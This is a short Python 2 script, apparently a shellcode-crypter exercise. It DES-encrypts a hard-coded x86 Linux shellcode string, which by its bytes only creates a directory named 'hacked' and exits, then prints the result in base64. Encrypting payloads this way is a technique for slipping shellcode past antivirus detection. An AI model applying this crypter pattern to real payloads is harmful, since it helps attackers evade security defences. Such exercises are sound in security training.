import base64 
from Crypto.Cipher import DES 
def Encrypt(value): 
	des = DES.new(value, DES.MODE_ECB) 
	shellcode = "\xeb\x11\x5e\x31\xc0\xb0\x27\x87\xde\x66\xb9\xed\x01\xcd\x80\xfe\xc0\xcd\x80\xe8\xea\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x90\x90" 
	cipher_text =base64.b64encode(des.encrypt(shellcode)) 
	return cipher_text 

if __name__ == "__main__": 
	key = raw_input("Please enter encryption Key - 8 bytes \n") 
	while (len(key) != 8 ): 
		key = raw_input("Please enter encryption Key - 8 bytes \n") 
	
	final_out = Encrypt(key) 
	print final_out
